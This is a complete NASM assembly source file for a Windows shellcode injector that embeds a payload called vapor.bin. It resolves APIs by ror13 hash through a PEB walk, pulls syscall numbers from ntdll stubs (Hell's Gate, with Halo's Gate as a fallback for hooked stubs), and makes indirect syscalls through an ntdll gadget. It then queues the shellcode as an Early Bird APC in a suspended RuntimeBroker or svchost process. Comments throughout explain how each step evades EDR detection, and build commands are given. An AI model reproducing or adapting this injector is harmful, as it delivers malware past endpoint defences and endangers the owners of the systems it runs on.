; ============================================================================
; injector.asm — Hell's Gate + Indirect Syscall + Early Bird APC Injector
;
; Injects embedded vapor.bin shellcode into a sacrificial process using:
;   - Hell's Gate:       Runtime SSN extraction from ntdll stubs
;   - Halo's Gate:       Fallback when stubs are hooked (neighbor scanning)
;   - Indirect syscalls: Jumps to ntdll's syscall;ret gadget (clean call stack)
;   - Early Bird APC:    Queues shellcode to suspended thread before it runs
;
; Build:
;   nasm -f win64 injector.asm -o injector.obj
;   x86_64-w64-mingw32-ld --entry=_start --subsystem=windows -o injector.exe injector.obj
;
; Usage:
;   injector.exe   (no arguments — spawns sacrificial host process)
;
; Configure target process at build time:
;   nasm -f win64 -DTARGET_PROCESS='"C:\Windows\System32\svchost.exe"' injector.asm
; ============================================================================

bits 64
default rel

; ── Windows constants ──
%define CREATE_SUSPENDED      0x00000004
%define CREATE_NO_WINDOW      0x08000000
%define MEM_COMMIT            0x00001000
%define MEM_RESERVE           0x00002000
%define PAGE_READWRITE        0x04
%define PAGE_EXECUTE_READ     0x20

; Default target process (override with -DTARGET_PROCESS='"..."')
%ifndef TARGET_PROCESS
%define TARGET_PROCESS 'C:\Windows\System32\RuntimeBroker.exe'
%endif

; ── Workspace offsets (relative to r15) ──
%define SSN_NtAllocateVirtualMemory   0
%define SSN_NtWriteVirtualMemory      8
%define SSN_NtProtectVirtualMemory    16
%define SSN_NtQueueApcThread          24
%define SSN_NtResumeThread            32
%define GADGET_ADDR                   40
%define ADDR_CreateProcessA           48
%define ADDR_ExitProcess              56
%define OFF_STARTUPINFO               64    ; 104 bytes
%define OFF_PROCESSINFO               168   ; 24 bytes
%define OFF_BaseAddress               192   ; 8 bytes (NtAllocateVirtualMemory)
%define OFF_RegionSize                200   ; 8 bytes
%define OFF_OldProtect                208   ; 4 bytes (NtProtectVirtualMemory)
%define OFF_BytesWritten              216   ; 8 bytes (NtWriteVirtualMemory)

; ── ror13 hashes ──
; Module names (wide string, lowercase)
%define H_ntdll               0xcef6e822
%define H_kernel32            0x8fecd63f

; kernel32 exports
%define H_CreateProcessA      0x16b3fe72
%define H_ExitProcess         0x73e2d87e

; ntdll Nt* exports (for Hell's Gate SSN extraction)
%define H_NtAllocateVirtualMemory  0xd33bcabd
%define H_NtWriteVirtualMemory     0xc5108cc2
%define H_NtProtectVirtualMemory   0x8c394d89
%define H_NtQueueApcThread         0x52e9a746
%define H_NtResumeThread           0xc54a46c8


section .text
global _start

; ============================================================================
; _start — Main entry point
; ============================================================================
_start:
    mov     rbp, rsp
    and     rsp, -16
    sub     rsp, 1024              ; workspace
    lea     r15, [rsp]             ; r15 = workspace base

    ; ════════════════════════════════════════════════════════════════
    ; Step 1: Find ntdll.dll and kernel32.dll via PEB
    ; ════════════════════════════════════════════════════════════════
    mov     edx, H_ntdll
    call    find_module_by_hash
    test    rax, rax
    jz      .exit_fail
    mov     r14, rax               ; r14 = ntdll base

    mov     edx, H_kernel32
    call    find_module_by_hash
    test    rax, rax
    jz      .exit_fail
    mov     r13, rax               ; r13 = kernel32 base

    ; ════════════════════════════════════════════════════════════════
    ; Step 2: Resolve kernel32 APIs (normal PEB walk, not syscalls)
    ; ════════════════════════════════════════════════════════════════
    mov     rcx, r13
    mov     edx, H_CreateProcessA
    call    resolve_hash
    test    rax, rax
    jz      .exit_fail
    mov     [r15 + ADDR_CreateProcessA], rax

    mov     rcx, r13
    mov     edx, H_ExitProcess
    call    resolve_hash
    test    rax, rax
    jz      .exit_fail
    mov     [r15 + ADDR_ExitProcess], rax

    ; ════════════════════════════════════════════════════════════════
    ; Step 3: Hell's Gate — extract syscall numbers from ntdll stubs
    ;
    ; For each Nt* function, we find it in ntdll's export table,
    ; then read the stub bytes to extract the SSN. If the stub is
    ; hooked (starts with JMP instead of mov r10,rcx), Halo's Gate
    ; scans neighbor stubs (±32 bytes) and adjusts the SSN.
    ; ════════════════════════════════════════════════════════════════

    ; NtAllocateVirtualMemory
    mov     rcx, r14
    mov     edx, H_NtAllocateVirtualMemory
    call    resolve_hash
    test    rax, rax
    jz      .exit_fail
    mov     rcx, rax
    call    hells_gate_extract
    cmp     eax, -1
    je      .exit_fail
    mov     [r15 + SSN_NtAllocateVirtualMemory], eax

    ; NtWriteVirtualMemory
    mov     rcx, r14
    mov     edx, H_NtWriteVirtualMemory
    call    resolve_hash
    test    rax, rax
    jz      .exit_fail
    mov     rcx, rax
    call    hells_gate_extract
    cmp     eax, -1
    je      .exit_fail
    mov     [r15 + SSN_NtWriteVirtualMemory], eax

    ; NtProtectVirtualMemory
    mov     rcx, r14
    mov     edx, H_NtProtectVirtualMemory
    call    resolve_hash
    test    rax, rax
    jz      .exit_fail
    mov     rcx, rax
    call    hells_gate_extract
    cmp     eax, -1
    je      .exit_fail
    mov     [r15 + SSN_NtProtectVirtualMemory], eax

    ; NtQueueApcThread
    mov     rcx, r14
    mov     edx, H_NtQueueApcThread
    call    resolve_hash
    test    rax, rax
    jz      .exit_fail
    mov     rcx, rax
    call    hells_gate_extract
    cmp     eax, -1
    je      .exit_fail
    mov     [r15 + SSN_NtQueueApcThread], eax

    ; NtResumeThread
    mov     rcx, r14
    mov     edx, H_NtResumeThread
    call    resolve_hash
    test    rax, rax
    jz      .exit_fail
    mov     rcx, rax
    call    hells_gate_extract
    cmp     eax, -1
    je      .exit_fail
    mov     [r15 + SSN_NtResumeThread], eax

    ; ════════════════════════════════════════════════════════════════
    ; Step 4: Find syscall;ret gadget in ntdll
    ;
    ; We scan ntdll's memory for the byte sequence 0F 05 C3
    ; (syscall; ret). Our indirect_syscall wrapper jumps here
    ; so the syscall instruction executes from ntdll's address
    ; space — EDR sees a legitimate ntdll return address.
    ; ════════════════════════════════════════════════════════════════
    mov     rcx, r14
    call    find_gadget
    test    rax, rax
    jz      .exit_fail
    mov     [r15 + GADGET_ADDR], rax

    ; ════════════════════════════════════════════════════════════════
    ; Step 5: CreateProcessA — spawn sacrificial process, suspended
    ;
    ; The target process is configurable at build time via TARGET_PROCESS.
    ; Default: RuntimeBroker.exe (common on Win10/11, blends in).
    ; CREATE_SUSPENDED means the main thread hasn't started — perfect
    ; for Early Bird APC injection.
    ; ════════════════════════════════════════════════════════════════

    ; Zero STARTUPINFOA
    lea     rdi, [r15 + OFF_STARTUPINFO]
    xor     eax, eax
    mov     ecx, 104
    rep     stosb
    mov     dword [r15 + OFF_STARTUPINFO], 104  ; cb

    ; Zero PROCESS_INFORMATION
    lea     rdi, [r15 + OFF_PROCESSINFO]
    xor     eax, eax
    mov     ecx, 24
    rep     stosb

    ; Get target process path (call/pop PIC trick)
    call    .get_target_path
    db      TARGET_PROCESS, 0
.get_target_path:
    pop     rdx                                ; lpCommandLine

    xor     ecx, ecx                           ; lpApplicationName = NULL
    xor     r8d, r8d                           ; lpProcessAttributes = NULL
    xor     r9d, r9d                           ; lpThreadAttributes = NULL
    sub     rsp, 80                            ; shadow(32) + 6 stack args
    mov     dword [rsp+32], 1                  ; bInheritHandles = TRUE
    mov     dword [rsp+40], CREATE_SUSPENDED | CREATE_NO_WINDOW
    mov     qword [rsp+48], 0                  ; lpEnvironment = NULL
    mov     qword [rsp+56], 0                  ; lpCurrentDirectory = NULL
    lea     rax, [r15 + OFF_STARTUPINFO]
    mov     [rsp+64], rax                      ; lpStartupInfo
    lea     rax, [r15 + OFF_PROCESSINFO]
    mov     [rsp+72], rax                      ; lpProcessInformation
    call    [r15 + ADDR_CreateProcessA]
    add     rsp, 80
    test    eax, eax
    jz      .exit_fail

    ; Save handles for injection
    mov     r12, [r15 + OFF_PROCESSINFO]       ; r12 = hProcess
    mov     rbx, [r15 + OFF_PROCESSINFO + 8]   ; rbx = hThread

    ; ════════════════════════════════════════════════════════════════
    ; Step 6: NtAllocateVirtualMemory — allocate RW memory in target
    ;
    ; Indirect syscall: our wrapper does mov r10,rcx then jumps to
    ; ntdll's syscall;ret gadget. To EDR, the syscall originates
    ; from ntdll — not from our code.
    ; ════════════════════════════════════════════════════════════════
    mov     qword [r15 + OFF_BaseAddress], 0   ; OS picks address
    lea     rax, [rel payload_end]
    lea     rcx, [rel payload]
    sub     rax, rcx
    mov     [r15 + OFF_RegionSize], rax        ; payload size

    mov     rcx, r12                           ; ProcessHandle
    lea     rdx, [r15 + OFF_BaseAddress]       ; &BaseAddress
    xor     r8d, r8d                           ; ZeroBits = 0
    lea     r9, [r15 + OFF_RegionSize]         ; &RegionSize
    sub     rsp, 48
    mov     dword [rsp+32], MEM_COMMIT | MEM_RESERVE
    mov     dword [rsp+40], PAGE_READWRITE
    mov     eax, [r15 + SSN_NtAllocateVirtualMemory]
    call    indirect_syscall
    add     rsp, 48
    test    eax, eax
    jnz     .exit_fail

    ; ════════════════════════════════════════════════════════════════
    ; Step 7: NtWriteVirtualMemory — write shellcode to target
    ; ════════════════════════════════════════════════════════════════
    mov     rcx, r12                           ; ProcessHandle
    mov     rdx, [r15 + OFF_BaseAddress]       ; BaseAddress (allocated)
    lea     r8, [rel payload]                  ; Buffer (embedded shellcode)
    lea     rax, [rel payload_end]
    sub     rax, r8
    mov     r9, rax                            ; NumberOfBytesToWrite
    sub     rsp, 48
    lea     rax, [r15 + OFF_BytesWritten]
    mov     [rsp+32], rax                      ; &NumberOfBytesWritten
    mov     eax, [r15 + SSN_NtWriteVirtualMemory]
    call    indirect_syscall
    add     rsp, 48
    test    eax, eax
    jnz     .exit_fail

    ; ════════════════════════════════════════════════════════════════
    ; Step 8: NtProtectVirtualMemory — change RW → RX
    ;
    ; Avoids leaving RWX memory (which EDR flags). Shellcode memory
    ; becomes executable but not writable.
    ; ════════════════════════════════════════════════════════════════
    ; Reset RegionSize (NtAllocateVirtualMemory may have rounded up)
    lea     rax, [rel payload_end]
    lea     rcx, [rel payload]
    sub     rax, rcx
    mov     [r15 + OFF_RegionSize], rax

    mov     rcx, r12                           ; ProcessHandle
    lea     rdx, [r15 + OFF_BaseAddress]       ; &BaseAddress
    lea     r8, [r15 + OFF_RegionSize]         ; &RegionSize
    mov     r9d, PAGE_EXECUTE_READ             ; NewProtect
    sub     rsp, 48
    lea     rax, [r15 + OFF_OldProtect]
    mov     [rsp+32], rax                      ; &OldProtect
    mov     eax, [r15 + SSN_NtProtectVirtualMemory]
    call    indirect_syscall
    add     rsp, 48
    test    eax, eax
    jnz     .exit_fail

    ; ════════════════════════════════════════════════════════════════
    ; Step 9: NtQueueApcThread — queue shellcode as APC
    ;
    ; Early Bird: the thread is still suspended from CreateProcessA.
    ; The APC fires as soon as the thread is resumed — BEFORE the
    ; process's own entry point runs. Our shellcode executes first.
    ; ════════════════════════════════════════════════════════════════
    mov     rcx, rbx                           ; ThreadHandle
    mov     rdx, [r15 + OFF_BaseAddress]       ; ApcRoutine = shellcode
    xor     r8d, r8d                           ; ApcArgument1 = NULL
    xor     r9d, r9d                           ; ApcArgument2 = NULL
    sub     rsp, 48
    mov     qword [rsp+32], 0                  ; ApcArgument3 = NULL
    mov     eax, [r15 + SSN_NtQueueApcThread]
    call    indirect_syscall
    add     rsp, 48
    test    eax, eax
    jnz     .exit_fail

    ; ════════════════════════════════════════════════════════════════
    ; Step 10: NtResumeThread — trigger shellcode execution
    ; ════════════════════════════════════════════════════════════════
    mov     rcx, rbx                           ; ThreadHandle
    xor     edx, edx                           ; PreviousSuspendCount = NULL
    sub     rsp, 32
    mov     eax, [r15 + SSN_NtResumeThread]
    call    indirect_syscall
    add     rsp, 32

    ; ════════════════════════════════════════════════════════════════
    ; Step 11: Clean exit — shellcode is now running in target
    ; ════════════════════════════════════════════════════════════════
    xor     ecx, ecx                           ; exit code 0
    sub     rsp, 32
    call    [r15 + ADDR_ExitProcess]

.exit_fail:
    mov     ecx, 1
    sub     rsp, 32
    call    [r15 + ADDR_ExitProcess]


; ============================================================================
; find_module_by_hash — Walk PEB InMemoryOrderModuleList
;
; Walks the PEB loader data structures to find a loaded module by
; ror13 hash of its name. This is the same technique vapor uses
; to find kernel32.dll, generalized to find any module.
;
; Input:  edx = ror13 hash of module name (compared lowercase)
; Output: rax = module base address, or 0 if not found
; ============================================================================
find_module_by_hash:
    push    rbx
    push    rsi
    push    rdi
    push    r12

    mov     r12d, edx              ; save target hash

    ; PEB → PEB_LDR_DATA → InMemoryOrderModuleList
    mov     rax, [gs:0x60]         ; PEB
    mov     rax, [rax + 0x18]      ; PEB_LDR_DATA
    lea     rsi, [rax + 0x20]      ; &InMemoryOrderModuleList (list head)
    mov     rbx, rsi               ; save head for wrap-around check

.next_module:
    mov     rsi, [rsi]             ; Flink → next LIST_ENTRY
    cmp     rsi, rbx
    je      .module_not_found      ; wrapped around — not found

    ; InMemoryOrderLinks is at LDR_DATA_TABLE_ENTRY + 0x10
    ; So from rsi (which points to InMemoryOrderLinks):
    ;   DllBase     = rsi + 0x20  (entry + 0x30)
    ;   BaseDllName = rsi + 0x48  (entry + 0x58, UNICODE_STRING)
    ;   Buffer      = rsi + 0x50  (entry + 0x60)
    mov     rdi, [rsi + 0x50]      ; BaseDllName.Buffer (wide string)
    test    rdi, rdi
    jz      .next_module

    ; Compute ror13 hash of module name (wide chars, lowercased)
    xor     eax, eax
.hash_mod_char:
    movzx   ecx, word [rdi]
    test    cx, cx
    jz      .hash_mod_done
    cmp     cl, 'A'
    jb      .no_lower
    cmp     cl, 'Z'
    ja      .no_lower
    or      cl, 0x20               ; lowercase
.no_lower:
    ror     eax, 13
    add     eax, ecx
    add     rdi, 2                 ; next wide char
    jmp     .hash_mod_char

.hash_mod_done:
    cmp     eax, r12d
    jne     .next_module

    ; Found — return DllBase
    mov     rax, [rsi + 0x20]
    pop     r12
    pop     rdi
    pop     rsi
    pop     rbx
    ret

.module_not_found:
    xor     eax, eax
    pop     r12
    pop     rdi
    pop     rsi
    pop     rbx
    ret


; ============================================================================
; resolve_hash — Walk module export table, match ror13 hash
;
; Same technique as vapor. Walks the PE export directory of a loaded
; module, hashing each export name with ror13 until a match is found.
;
; Input:  rcx = module base address
;         edx = ror13 hash of function name
; Output: rax = function address, or 0 if not found
; ============================================================================
resolve_hash:
    push    rbx
    push    rsi
    push    rdi
    push    r12
    push    r13

    mov     r12, rcx               ; module base
    mov     r13d, edx              ; target hash

    ; Parse PE: DOS header → NT headers → export directory
    mov     eax, [r12 + 0x3C]     ; e_lfanew
    lea     rax, [r12 + rax]      ; NT headers
    mov     eax, [rax + 0x88]     ; DataDirectory[0].VirtualAddress (exports)
    test    eax, eax
    jz      .resolve_not_found
    lea     rbx, [r12 + rax]      ; IMAGE_EXPORT_DIRECTORY

    mov     ecx, [rbx + 0x18]     ; NumberOfNames
    mov     esi, [rbx + 0x20]     ; AddressOfNames RVA
    add     rsi, r12              ; AddressOfNames VA

.resolve_next:
    dec     ecx
    js      .resolve_not_found

    mov     eax, [rsi + rcx*4]    ; name RVA
    lea     rdi, [r12 + rax]      ; name VA

    ; ror13 hash the export name
    xor     eax, eax
.resolve_hash_char:
    movzx   edx, byte [rdi]
    test    dl, dl
    jz      .resolve_hash_cmp
    ror     eax, 13
    add     eax, edx
    inc     rdi
    jmp     .resolve_hash_char

.resolve_hash_cmp:
    cmp     eax, r13d
    jne     .resolve_next

    ; Match — get ordinal → function address
    mov     eax, [rbx + 0x24]     ; AddressOfNameOrdinals RVA
    lea     rax, [r12 + rax]
    movzx   ecx, word [rax + rcx*2]

    mov     eax, [rbx + 0x1C]     ; AddressOfFunctions RVA
    lea     rax, [r12 + rax]
    mov     eax, [rax + rcx*4]    ; function RVA
    lea     rax, [r12 + rax]      ; function VA

    pop     r13
    pop     r12
    pop     rdi
    pop     rsi
    pop     rbx
    ret

.resolve_not_found:
    xor     eax, eax
    pop     r13
    pop     r12
    pop     rdi
    pop     rsi
    pop     rbx
    ret


; ============================================================================
; hells_gate_extract — Extract syscall number from ntdll stub
;
; Normal (unhooked) ntdll Nt* stub layout:
;   4C 8B D1           mov r10, rcx
;   B8 XX XX 00 00     mov eax, <SSN>
;   0F 05              syscall
;   C3                 ret
;
; If hooked, the first bytes are replaced with a JMP to EDR code.
; Halo's Gate: scan neighbors (each stub is 32 bytes apart) to find
; an unhooked stub, then adjust the SSN by the distance.
;
; Input:  rcx = address of Nt* function in ntdll
; Output: eax = syscall number, or -1 if all neighbors hooked
; ============================================================================
hells_gate_extract:
    push    rbx
    mov     rbx, rcx

    ; Check for normal (unhooked) stub: 4C 8B D1 B8
    cmp     dword [rbx], 0xB8D18B4C
    jne     .try_halos_gate

    ; Clean stub — extract SSN directly
    mov     eax, [rbx + 4]
    pop     rbx
    ret

.try_halos_gate:
    ; Stub is hooked. Scan neighbors in both directions.
    ; ntdll syscall stubs are 32 bytes apart on Win10/11.
    mov     ecx, 1                 ; neighbor distance

.halo_loop:
    cmp     ecx, 16               ; scan up to 16 neighbors each way
    jge     .halo_fail

    ; Try neighbor ABOVE (lower SSN): function - distance * 32
    mov     eax, ecx
    shl     eax, 5                 ; * 32
    cdqe
    mov     rdx, rbx
    sub     rdx, rax
    cmp     dword [rdx], 0xB8D18B4C
    jne     .try_below

    ; Unhooked neighbor above: its SSN + distance = our SSN
    mov     eax, [rdx + 4]
    add     eax, ecx
    pop     rbx
    ret

.try_below:
    ; Try neighbor BELOW (higher SSN): function + distance * 32
    mov     eax, ecx
    shl     eax, 5
    cdqe
    mov     rdx, rbx
    add     rdx, rax
    cmp     dword [rdx], 0xB8D18B4C
    jne     .halo_next

    ; Unhooked neighbor below: its SSN - distance = our SSN
    mov     eax, [rdx + 4]
    sub     eax, ecx
    pop     rbx
    ret

.halo_next:
    inc     ecx
    jmp     .halo_loop

.halo_fail:
    mov     eax, -1                ; all neighbors hooked — can't extract
    pop     rbx
    ret


; ============================================================================
; find_gadget — Scan ntdll for syscall;ret gadget (0F 05 C3)
;
; The indirect syscall technique requires executing the actual syscall
; instruction from within ntdll's address space. We scan ntdll for the
; byte sequence 0F 05 C3 (syscall; ret) and return its address.
;
; This means when EDR inspects the call stack, the syscall originated
; from ntdll — exactly where it's expected to come from.
;
; Input:  rcx = ntdll base address
; Output: rax = address of syscall instruction, or 0 if not found
; ============================================================================
find_gadget:
    push    rbx
    push    rsi

    mov     rbx, rcx               ; ntdll base

    ; Get SizeOfImage from PE headers for scan boundary
    mov     eax, [rbx + 0x3C]     ; e_lfanew
    lea     rax, [rbx + rax]      ; NT headers
    mov     ecx, [rax + 0x50]     ; SizeOfImage

    lea     rsi, [rbx]            ; scan start
    lea     rdx, [rbx + rcx]     ; scan end
    sub     rdx, 3                ; need 3 bytes for the pattern

.scan_loop:
    cmp     rsi, rdx
    jae     .gadget_not_found

    ; Look for: 0F 05 C3 (syscall; ret)
    cmp     word [rsi], 0x050F
    jne     .scan_next
    cmp     byte [rsi + 2], 0xC3
    jne     .scan_next

    ; Found syscall;ret gadget
    mov     rax, rsi
    pop     rsi
    pop     rbx
    ret

.scan_next:
    inc     rsi
    jmp     .scan_loop

.gadget_not_found:
    xor     eax, eax
    pop     rsi
    pop     rbx
    ret


; ============================================================================
; indirect_syscall — Execute syscall via ntdll gadget
;
; This is the core of the indirect syscall technique. Instead of having
; the syscall instruction in our own code (which EDR detects via return
; address inspection), we jump to ntdll's syscall;ret gadget.
;
; The caller invokes this like a normal function:
;   mov rcx, arg1  /  mov rdx, arg2  /  ...  /  mov eax, SSN
;   call indirect_syscall
;
; We do: mov r10, rcx (Windows syscall convention), then jmp to the
; gadget. The gadget's ret pops our caller's return address. The full
; call stack looks like the syscall came from ntdll.
;
; Input:  eax = syscall number (SSN)
;         rcx, rdx, r8, r9, stack = syscall arguments
; Output: eax = NTSTATUS
; ============================================================================
indirect_syscall:
    mov     r10, rcx               ; Windows syscall ABI: 1st arg in r10
    jmp     qword [r15 + GADGET_ADDR]
    ; → ntdll: syscall; ret → returns to caller


; ============================================================================
; Embedded payload — vapor.bin included at build time
;
; The shellcode is position-independent, so it runs correctly at any
; address. The Makefile builds vapor.bin first, then assembles this
; file which includes it via incbin.
; ============================================================================
align 16
payload:
    incbin "vapor.bin"
payload_end:
